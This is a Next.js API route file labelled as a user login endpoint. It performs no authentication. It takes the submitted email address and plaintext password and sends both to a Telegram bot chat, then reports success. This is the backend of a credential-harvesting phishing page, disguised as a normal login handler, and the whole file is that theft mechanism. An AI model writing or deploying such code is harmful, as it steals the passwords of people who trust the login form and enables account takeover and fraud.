// src/app/api/users/login/route.ts
import { NextRequest, NextResponse } from "next/server";
import axios from "axios";

export async function POST(req: NextRequest) {
  const body = await req.json(); // <-- this parses the JSON body!
  const { email, password } = body;

  // Telegram Bot credentials
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  const message = `Login attempt:\nEmail: ${email}\nPassword: ${password}`;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });
    return NextResponse.json({ ok: true });
  } catch (error) {
    if (axios.isAxiosError(error)) {
      console.error("Login failed:", error.response?.data || error.message);
    } else if (error instanceof Error) {
      console.error("Login Error:", error.message);
    } else {
      console.error("An unexpected error occurred during login");
    }
    return NextResponse.json({ error: "Failed to send to Telegram" }, { status: 500 });
  }
}
